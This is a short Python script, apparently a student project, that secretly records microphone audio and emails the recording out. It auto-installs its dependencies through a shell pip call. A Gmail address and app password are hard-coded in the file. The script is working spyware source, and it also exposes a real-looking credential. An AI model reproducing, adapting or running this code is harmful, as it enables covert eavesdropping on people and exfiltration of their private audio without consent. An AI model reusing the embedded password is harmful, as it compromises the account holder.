try: #import necessary libraries
    import threading
    import sounddevice as sd 
    from scipy.io.wavfile import write
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["sounddevice","scipy"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "sudeeproy67@gmail.com"
    EMAIL_PASSWORD = "nusrpvxakgvnhefp"
    SEND_REPORT_EVERY = 30 
    FILENAME = "C:/Users/sudee/ISAA/output.wav"

    class AudioLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "AudioLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def save_data(self):
            fs = 44100  
            seconds = 3  

            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait() 
            write('output.wav', fs, myrecording)
            send_mail(self.email, self.password, FILENAME)

        def run(self):
            timer = threading.Timer(self.interval, self.save_data)
            timer.start()

    Audiologger = AudioLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Audiologger.run()